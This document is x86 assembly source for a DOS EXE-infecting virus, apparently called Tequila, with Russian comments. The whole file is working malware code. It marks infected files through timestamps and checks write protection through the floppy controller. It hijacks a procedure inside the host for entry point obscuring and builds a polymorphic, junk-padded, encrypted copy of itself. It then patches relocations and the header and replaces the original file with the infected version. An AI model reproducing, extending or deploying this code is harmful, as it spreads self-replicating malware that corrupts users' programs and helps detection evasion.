MZ_sign 	equ	0
PartPage	equ	2
PageCnt 	equ	4
RelocCnt	equ	6
HdrSize 	equ	8
StackPointer	equ	0Eh
ChkSum		equ	12h
EntryPointer	equ	14h
EntryCS 	equ	16h
TablOffs	equ	18h

MainInfect	proc
		pushad
		pushf
		push	es
		push	ds

		call	TestFile	; Уже заражен
		jz	ExitMain

		cmp	word ptr [Header+MZ_sign],'ZM'	; Не EXE'шник
		jne	ExitMain

		push	dx		; Диск пути с файлом
		pop	si
		lodsw
		xor	bl,bl
		cmp	ah,':'
		jne	CurrentDisk
		and	al,0DFh
		sub	al,'A'
		inc	al
		mov	bl,al
CurrentDisk:

		mov	ax,4409h	; Сетевой диск ?
		call	DOS
		test	dh,10h
		jz	ExitMain

		mov	ax,4408h
		call	DOS
		test	ax,ax
		jnz	HardDrive	; Файл на жестком диске

		mov	dx,3F5h
		mov	al,4		; Sense Drive Status
		out	dx,al

		mov	cx,400h
		loop	$

		in	al,dx		; Установлена заSHITа от записи
		test	al,40h
		jnz	ExitMain
HardDrive:
		mov	dl,bl
		mov	ah,36h		; Получим место
		call	DOS

		mul	bx
		push	dx
		push	ax
		pop	eax
		movzx	ecx,cx
		mul	ecx

		mov	edx,fs:[di+11h]
		add	edx,2800h	 ; + еще 2 Кб
		cmp	eax,edx
		jb	ExitMain	 ; Мало места на диске

		call	UEPInfect

		mov	bx,[handle]
		jc	ExitMain

		mov	cx,0000h	; Установим Время/Дату
InfTime 	equ	$ - 2
		mov	dx,0000h
InfDate 	equ	$ - 2
		mov	ax,5701h
		call	DOS
ExitMain:
		mov	ah,3Eh
		call	DOS

		pop	ds
		pop	es
		popfd
		popad
		ret
MainInfect	endp
;───────────────────
TestFile	proc
; На выходе:
; ZF=0 - файл не заражен
; ZF=1 - файл заражен
		lds	dx,[FileName]
		push	dx
		mov	ax,3D00h
		call	DOS

		push	cs
		pop	ds

		mov	[Handle],ax   ; ES:DI - File Parameter Block
		mov	bx,ax	      ; Будем работать с файлом на уровне FPB
		call	GetFPB
		mov	word ptr fs:[di+2],2   ; Режим открытия - Read/Write

		mov	ah,3Fh		       ; Считаем заголовок
		mov	cx,1Ah
		mov	dx,offset Header
		call	DOS

		push	dword ptr fs:[di+0Dh]  ; push Время/Дату
		pop	dx
		rol	dh,5
		and	dh,1Fh		       ; Час
		pop	ax
		and	al,1Fh		       ; День
		xor	dh,al
		and	dl,1Fh		       ; Секунды

		cmp	dl,dh
		pushf
		je	ItsInfected

		mov	eax,fs:[di+0Dh]     ; Установим новое значение
		and	al,0E0h
		or	al,dh
		mov	word ptr [InfTime],ax
		rol	eax,10h
		mov	word ptr [InfDate],ax
ItsInfected:
		popf
		pop	dx
		ret
TestFile	endp
;───────────────────
UEPinfect	proc

		mov	bx,[handle]
		call	GetFPB

		mov	edx,fs:[di+11h]   ; edx - RealLen
		mov	dword ptr [RealLen],edx

		mov	ax,word ptr [Header+PageCnt]
		cwde
		shl	eax,9	  ; Реальная длинна больше загружаемой
		cmp	eax,edx
		jc	ExitUEPInfect	  ; Скрытый Overlay

		mov	ax,word ptr [Header+EntryCS]
		mov	bx,word ptr [Header+StackPointer]
		sub	bx,ax	    ; Как правило стек в конце файла
		mov	ax,1000h
		jb	FullSegment

		add	bx,word ptr [Header+HdrSize]   ; Место для Header'a
		add	bx,TeqTempWSP
		cmp	ax,bx
		jnb	Scarp	    ; Обрежем
FullSegment:
		mov	bx,ax	    ; BX - сколько параграфов нужно считать
Scarp:				    ; Не больше 64Кб
		mov	ah,48h
		call	DOS
		jnc	AllocOK

		mov	dx,bx	    ; А это уже рискованнее...
		inc	dx
		call	ReAllocateMEM
LastAttempt:
		mov	ah,48h
		call	DOS
		jnc	AllocOK

		cmp	bx,800h
		jnb	LastAttempt ; Если дают не меньше половины то берем
		ret
AllocOK:
		mov	es,ax
		sub	bx,word ptr [Header+HdrSize]
		mov	cx,bx
		add	bx,ax
		mov	gs,bx	; Сегмент для Header'a вместе с ТНА

		sub	cx,TeqTempWSP	; Сегмент для копии вируса
		add	ax,cx
		mov	word ptr [TeqCopyID],ax

		shl	cx,4	; Длинна считываемого блока

		mov	ax,word ptr [Header+EntryCS]
		movzx	eax,ax
		shl	eax,4
		call	BeginData     ; Начало CodeSeg в файле
		add	eax,edx

		mov	fs:[di+15h],eax     ;Отьедем на Code Seg

		push	ds
		push	es	; DS - на выделенный блок
		pop	ds

		mov	bx,cs:[handle]	; Читаем...
		mov	ah,3Fh
		xor	dx,dx
		call	DOS
		pop	ds
		mov	[LenCode],ax	; Длинна считанного кода

		mov	word ptr [StartCode],0
		mov	word ptr [SearchLen],ax

		xor	eax,eax
		mov	fs:[di+15h],eax     ; Отьедем на начало

		push	ds		; Читаем заголовок
		push	gs
		pop	ds

		call	BeginData
		mov	cx,dx
		xor	dx,dx
		mov	ah,3Fh
		call	DOS
		pop	ds

; Ищем стандартную C/Pascal процедуру

NextProcedure:
		call	SearchProc     ; Ищем процедуру
		jc	FreeBlok       ; Нету ...
				       ; Только память зря запоганили...:-E

		cmp	di,MinPRCLen   ; Проверим на минимально
		jb	NextProcedure  ; допустимую длинну

; Процедура найдена ,проверим ее на RelocElements

		mov	dx,word ptr [Header+EntryCS]
		shl	edx,10h
		mov	dx,[EnterProc]

		mov	dword ptr [ProcAddress],edx ; Для выхода в носитель

		call	LineAddress		  ; Линейные границы
		mov	dword ptr [BeginPRC],edx
		mov	dx,[ExitProc]
		call	LineAddress
		mov	dword ptr [EndPRC],edx

		mov	si,word ptr [Header+TablOffs]
		mov	cx,word ptr [Header+RelocCnt]
AllRelocs:
		mov	edx,gs:[si]
		call	LineAddress
		cmp	edx,12345678h
BeginPRC	equ	$ - 4
		jb	RelOK
		cmp	edx,12345678h
EndPRC		equ	$ - 4
		jb	NextProcedure	 ; Процедура содержит RelocElement
					 ; поэтому она не годится
RelOK:
		add	si,4
		loop	AllRelocs

		push	es   ───────────────────────┐
						    │
		mov	ax,[TeqCopyID]	       ; Сегмент копии...
		mov	es,ax			    │
		xor	di,di			    │
						    │
		mov	dx,0FF80h    ; RND(0...128)*4 + RND(0...255)
		call	RND			    │
		movzx	cx,dl			    │
		shl	cx,2			    │
						    │
		shr	dx,4			    │
		call	RND			    │
		add	cx,dx			    │
		push	cx			    │
FillTRASH:				     ; Залили мусором
		mov	dl,0FFh 		    │
		call	RND			    │
		mov	al,dl			    │
		stosb				    │
		loop	FillTRASH		    │
						    │
		pop	ax		     ; Стартовое Смещение
		mov	dl,al			    │
		and	dl,0Fh			    │
		mov	byte ptr [TeqEntryOffset],dl
						    │
		shr	ax,4		     ; Стартовый сегмент
		mov	word ptr [TeqEntrySEG],ax   │
						    │
; Сделаем выход в вирус 			    │
						    │
		push	di			    │
						    │
		mov	di,TeqTempWSP-MinPRCLen     │
		push	di			    │
		mov	si,offset PreparePart	    │
		mov	cx,9			    │
						    │
MakePrPart:					    │
		push	cx			    │
		lodsb				    │
		mov	ch,al			    │
		shr	cx,13			    │
		rep	movsb			    │
		push	si			    │
						    │
		and	al,1Fh			    │
		mov	[REG_USED],al		    │
		and	al,0Fh			    │
		mov	ah,al			    │
		shl	ah,4			    │
		or	ah,al			    │
		mov	[HALF_USED],ah		    │
						    │
		mov	cx,GARBLELen		    │
TrString:					    │
		push	cx			    │
						    │
		mov	dx,offset RMTRASH	    │
		mov	bx,offset SimplyTRASH	    │
		in	al,40h			    │
		mov	cl,al			    │
RNDExch:	xchg	bx,dx			    │
		dec	cl			    │
		jnz	RNDExch 		    │
		call	bx			    │
						    │
		pop	cx			    │
		loop	TrString		    │
		pop	si			    │
		pop	cx			    │
		loop	MakePrPart		    │
						    │
		pop	ax			    │
		sub	di,ax			    │
		mov	[LenPreparePart],di	    │
						    │
; Делаем полиморфную копию - Direct Phantom 2.1     │
						    │
		pop	di			    │
		mov	word ptr [TARGETPLACE],di   │
		mov	word ptr [TARGETPLACE + 2],es
		mov	[RELOFFS],0		    │
		mov	[DEST_CODE],0FFFFh	    │
		mov	[COUNTER],TequilaLen	    │
						    │
		call	PHANTOM 		    │
						    │
		xor	si,si		 ; Переезжаем
		mov	word ptr [PAoffset],di	    │
		cld				    │
		mov	cx,TequilaLen		    │
		rep	movsb			    │
						    │
		mov	cx,[LenPreparePart]	    │
						    │
		mov	si,[EnterPROC]	 ; Прихватим│с собой процедурку
		pop	ds	 ───────────────────┘
		rep	movsb

		jmp	$+2

		push	di
		pop	bp	; Вот ОНА - текущая длинна
		mov	dx,bp
		neg	dl
		and	dx,0Fh
		add	bp,dx	; BP - длинна вируса выравненная до параграфа

		mov	word ptr gs:[CHKSUM],bp   ; Для игры в прятки
		shr	bp,4
		mov	bx,1234h
PAoffset	equ	$ - 2
		add	word ptr es:[bx+ProcAddress + 2],bp

		push	es
		push	ds	; ES - сканируемый код
		pop	es

		push	cs
		pop	ds
		call	JuNK_DoIT	  ; Зашифруем

		lds	dx,[FileName]
		xor	di,di	       ;Сформируем путь для создания TmpFile
		push	di
		stc
		call	CopyPath
		push	cs
		pop	ds
		mov	si,offset UEPTempFile
		call	AddFileName

		pop	dx
		push	es
		pop	ds
		xor	cx,cx
		mov	ah,3Ch	      ; Создаем TempFile
		call	DOS
		jc	FreeBlok
		mov	cs:[TempHandle],ax

		push	ax

		mov	bx,cs:[handle]
		call	GetFPB
		call	BeginData
		mov	fs:[di+15h],edx   ; Отьедем на начало в файле

		pop	bx
		call	GetFPB
		mov	fs:[di+15h],edx

		mov	cx,bp	  ; Пишем TequilaJazzz в новую квартиру
		shl	cx,4
		pop	ds
		mov	ah,40h
		xor	dx,dx
		call	DOS

; Перекопируем файл в Temp Файл

		xor	eax,eax
		mov	[UnderLimit],eax
CopyFile:
		xor	dx,dx
		mov	cx,[LenCode]
		mov	bx,[handle]
		push	ds
		push	es
		pop	ds
		mov	ah,3Fh
		call	DOS
		pop	ds
		test	ax,ax
		jz	EndCopy
		push	ax

		call	UpdateRelocates

		pop	cx
		xor	dx,dx
		mov	ah,40h
		mov	bx,[TempHandle]
		push	ds
		push	es
		pop	ds
		call	DOS
		pop	ds
		jmp	CopyFile
EndCopy:
		mov	ah,68h		; Сбросим буфера...
		call	DOS

		mov	bx,[TempHandle]
		call	GetFPB

; Отьедем на процедуру в скорректированном файле

		mov	edx,[ProcAddress]
		call	LineAddress

		mov	eax,edx
		call	BeginData
		add	eax,edx

		mov	fs:[di+15h],eax

		mov	dx,TeqTempWSP-MinPRCLen
		mov	cx,[LenPreparePart]
		mov	ax,[TeqCopyID]
		mov	ds,ax
		mov	ah,40h
		call	DOS

		push	cs
		pop	ds

		xor	edx,edx
		mov	fs:[di+15h],edx

; Скорректируем Адрес точки входа и Стека

		add	gs:[StackPointer],bp
		add	gs:[EntryCS],bp

; Скорректируем длинну в заголовке
		mov	dx,bp
		shl	edx,4
		add	edx,12345678h
RealLen 	equ	$-4

		mov	ax,dx
		and	ax,1FFh        ;Новая длинна в заголовке
		mov	word ptr gs:[PartPage],ax
		pushf
		shr	edx,9
		popf
		jz	@temp
		inc	dx
@temp:
		mov	word ptr gs:[PageCnt],dx
; Пишем Header
		call	BeginData
		mov	cx,dx
		xor	dx,dx
		mov	ah,40h
		push	ds
		push	gs
		pop	ds
		call	DOS
		pop	ds

		push	bx
;Закроем файл
		mov	bx,[handle]
		mov	ah,3Eh
		call	DOS

		pop	[handle]

;Уничтожим файл
		lds	dx,[FileName]
		mov	ah,41h
		call	DOS

;Переименуем Temp файл в заражаемый файл
		push	ds
		push	dx
		push	es
		xor	di,di
		push	di
		stc
		call	CopyPath

		mov	si,offset UEPTempFile
		push	cs
		pop	ds
		call	AddFileName

		pop	dx
		pop	ds
		pop	di
		pop	es
		mov	ah,56h
		call	DOS
		clc
FreeBlok:	pushf
		mov	ah,49h	     ;Освободим память
		call	DOS
		popf
ExitUEPInfect:	ret
UEPinfect	endp
;──────────────────────────────────────────────────────
SearchProc	proc	near
;Поиск стандартной дальней процедуры в первых 64Кб кода
;
;  Типа:	push	bp
;		mov	bp,sp
;		 .
;		 .
;		 .
;		pop	bp
;		retf [imm8] / retn [imm8]
;
;
; ES - Scanned programm code

; На выходе:
; DI - длинна процедуры

		mov	dx,0FFFFh	;ID что процедура не найдена
		mov	cx,00000h
SearchLen	equ	$ - 2
		mov	[EnterProc],dx
		mov	di,0000h
StartCode	equ	$ - 2

Scan:
		mov	ax,es:[di]
		cmp	al,55h		; PUSH BP
		je	EnterPRC
		cmp	al,5Dh		; POP BP
		je	ExitPRC
NextScan:
		inc	di
		dec	cx
		jne	Scan
		stc
		retn
EnterPRC:
		mov	ax,es:[di+1]

		cmp	ax,0EC8Bh	; MOV BP,SP
		je	EnterDone
		cmp	ax,0E589h
		jne	NextScan
EnterDone:
		mov	[EnterProc],di
		jmp	NextScan
ExitPRC:
		cmp	[EnterProc],dx
		je	NextScan
		and	ah,11110110b
		cmp	ah,11000010b
		je	ProcOK		; RETF/RETF Imm8/RETN/RETN Imm8
		mov	[EnterProc],dx
		jmp	NextScan
ProcOK:
		mov	[ExitPROC],di
		mov	ax,es:[di]	; Старые байтики...
		mov	[OldBytes],ax

		inc	di		; Для поиска следующей
		inc	di
		mov	word ptr [StartCode],di

		sub	di,[EnterProc]	; Длинна

		mov	word ptr [SearchLen],cx
		clc
		ret
SearchProc	endp
;────────────────────────────────────────────
BeginData	proc
;EDX - Начало данных в файле
		mov	dx,word ptr cs:[Header+HdrSize]
		movzx	edx,dx
		shl	dx,4
		ret
BeginData	endp
;────────────────────────────────────────────
GetFPB		proc
;Возвращает в FS:DI адрес File Parameter Block
;BX - Handle
		push	bx
		push	ax
		push	es
		mov	ax,1220h	;Номер входа в SFT
		int	2Fh		;ES:[di]

		mov	bl,es:[di]	;Получим блок описания файла
		mov	ax,1216h	;es:di
		int	2Fh

		push	es
		pop	fs

		pop	es
		pop	ax
		pop	bx
		ret
GetFPB		endp
;──────────────────────────────────────────────────
UpdateRelocates proc

		mov	si,word ptr [Header+TablOffs]
		mov	cx,word ptr [Header+RelocCnt]
		movzx	eax,[LenCode]
TunedRelocs:
		mov	edx,gs:[si]
		call	LineAddress

		db	66h,81h,0EAh	; sub edx,UnderLimit
UnderLimit	dd	0

		jb	GoNextReloc

		cmp	edx,eax
		jnb	GoNextReloc

		add	es:[edx],bp
GoNextReloc:
		add	si,4
		loop	TunedRelocs
		add	[UnderLimit],eax
		ret
UpdateRelocates endp
;───────────────────────────────────────
LineAddress	proc
;Из сегментного формирует линейный адрес
		push	 00
		push	 edx
		pop	 ax
		movzx	 eax,ax
		pop	 edx
		shl	 edx,4
		add	 edx,eax
		ret
LineAddress	endp
;───────────────────
PreparePart	equ	$

		db	01010000b    ; REG_USED + 1...4 байта команды
		pushf
		pusha
		db	00110000b
		push	ds
		db	00110000b
		push	es
		db	01010001b    ; AX - не портить
		mov	ah,62h
		db	01011000b    ; BX - не портить
		int	21h
		db	10011000b
		add	bx,1234h
TeqEntrySEG	equ	$ - 2
		db	00111000b
		push	bx
		db	01010000b
		push	00h
TeqEntryOffset	equ	$ - 1
		db	00110000b
		retf
EndPrPart	equ	$

;─────────────── UEP Engine DATA ─────────────────
UEPTempFile	db	'uepfile.tmp',0
LenCode 	dw	0
EnterPROC	dw	0
ExitPROC	dw	0
TempHandle	dw	0
;─────────────────────────────────────────────────
